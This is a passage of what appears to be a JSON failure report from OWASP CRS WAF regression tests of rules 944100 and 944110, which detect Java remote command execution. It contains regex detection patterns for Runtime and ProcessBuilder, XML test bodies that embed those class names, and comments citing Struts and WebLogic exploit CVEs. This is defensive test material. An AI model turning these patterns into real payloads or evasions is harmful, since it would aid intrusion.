          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "java\\.lang\\.(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Suspicious Java class detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944100",
    "test_id" : 16,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944100.yaml",
    "description" : "XML attribute name includes keywords java.lang.ProcessBuilder",
    "cause" : "failed no_expect_ids check: 944100 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944100 - Remote Command Execution: Suspicious Java class detected", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944130 - Suspicious Java class detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 16,
      "desc" : "XML attribute name includes keywords java.lang.ProcessBuilder",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element java.lang.ProcessBuilder=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944100 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944100,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -= Paranoia Level 1 (default) =- (apply only when tx.detection_paranoia_level is sufficiently high: 1 or higher)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Apache Struts Remote Code Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "java\\.lang\\.(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944100
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Suspicious Java class detected"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944110",
    "test_id" : 11,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944110.yaml",
    "description" : "XML element includes keywords java. and Runtime",
    "cause" : "failed no_expect_ids check: 944110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "XML element includes keywords java. and Runtime",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><java.Runtime attribute_name=\"attribute_value\">value</java.Runtime></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944110,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule is also triggered by the following exploit(s):"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Apache Struts (CVE-2017-9805) ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Oracle Weblogic (CVE-2017-10271) ]"
        }, {
          "type" : "Comment",
          "text" : " [ SAP CRM Java vulnerability CVE-2018-2380 - Exploit tested: https://www.exploit-db.com/exploits/44292 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic rule to detect processbuilder or runtime calls, if any of those is found and the same target contains"
        }, {
          "type" : "Comment",
          "text" : " java. unmarshaller or base64data to trigger a potential payload execution"
        }, {
          "type" : "Comment",
          "text" : " tested with https://www.exploit-db.com/exploits/42627/ and https://www.exploit-db.com/exploits/43458/"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java process spawn (CVE-2017-9805)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944110",
    "test_id" : 12,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944110.yaml",
    "description" : "XML attribute name includes keywords java. and Runtime",
    "cause" : "failed no_expect_ids check: 944110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "XML attribute name includes keywords java. and Runtime",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><element java.Runtime=\"attribute_value\">element_value</element></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944110,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule is also triggered by the following exploit(s):"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Apache Struts (CVE-2017-9805) ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Oracle Weblogic (CVE-2017-10271) ]"
        }, {
          "type" : "Comment",
          "text" : " [ SAP CRM Java vulnerability CVE-2018-2380 - Exploit tested: https://www.exploit-db.com/exploits/44292 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic rule to detect processbuilder or runtime calls, if any of those is found and the same target contains"
        }, {
          "type" : "Comment",
          "text" : " java. unmarshaller or base64data to trigger a potential payload execution"
        }, {
          "type" : "Comment",
          "text" : " tested with https://www.exploit-db.com/exploits/42627/ and https://www.exploit-db.com/exploits/43458/"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java process spawn (CVE-2017-9805)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944110",
    "test_id" : 15,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944110.yaml",
    "description" : "XML element includes keywords java. and ProcessBuilder",
    "cause" : "failed no_expect_ids check: 944110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected", "phase=2 rule_id=944250 - Remote Command Execution: Suspicious Java method detected" ]
    },
    "test" : {
      "test_id" : 15,
      "desc" : "XML element includes keywords java. and ProcessBuilder",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "port" : 80,
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip,deflate",
            "Accept-Language" : "en-us,en;q=0.5",
            "Content-Type" : "application/xml"
          },
          "method" : "POST",
          "uri" : "/post",
          "version" : "HTTP/1.1",
          "data" : "<?xml version=\"1.0\"?><xml><java.ProcessBuilder attribute_name=\"attribute_value\">value</java.ProcessBuilder></xml>"
        },
        "output" : {
          "log" : {
            "no_expect_ids" : [ 944110 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944110,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " This rule is also triggered by the following exploit(s):"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-5638 - Exploit tested: https://github.com/xsscx/cve-2017-5638 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9791 - Exploit tested: https://www.exploit-db.com/exploits/42324 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Apache Struts vulnerability CVE-2017-9805 - Exploit tested: https://www.exploit-db.com/exploits/42627 ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Apache Struts (CVE-2017-9805) ]"
        }, {
          "type" : "Comment",
          "text" : " [ Java deserialization vulnerability/Oracle Weblogic (CVE-2017-10271) ]"
        }, {
          "type" : "Comment",
          "text" : " [ SAP CRM Java vulnerability CVE-2018-2380 - Exploit tested: https://www.exploit-db.com/exploits/44292 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Generic rule to detect processbuilder or runtime calls, if any of those is found and the same target contains"
        }, {
          "type" : "Comment",
          "text" : " java. unmarshaller or base64data to trigger a potential payload execution"
        }, {
          "type" : "Comment",
          "text" : " tested with https://www.exploit-db.com/exploits/42627/ and https://www.exploit-db.com/exploits/43458/"
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BODY"
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?:runtime|processbuilder)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944110
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "lowercase"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Java process spawn (CVE-2017-9805)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "chain"
        } ]
      }
    }
  }, {
    "test_rule" : "944110",
    "test_id" : 16,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944110.yaml",
    "description" : "XML attribute name includes keyworda java. and ProcessBuilder",
    "cause" : "failed no_expect_ids check: 944110 was found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=941100 - XSS Attack Detected via libinjection", "phase=2 rule_id=941320 - Possible XSS Attack Detected - HTML Tag Handler", "phase=2 rule_id=942131 - SQL Injection Attack: SQL Boolean-based attack detected", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", "phase=2 rule_id=944110 - Remote Command Execution: Java process spawn (CVE-2017-9805)", 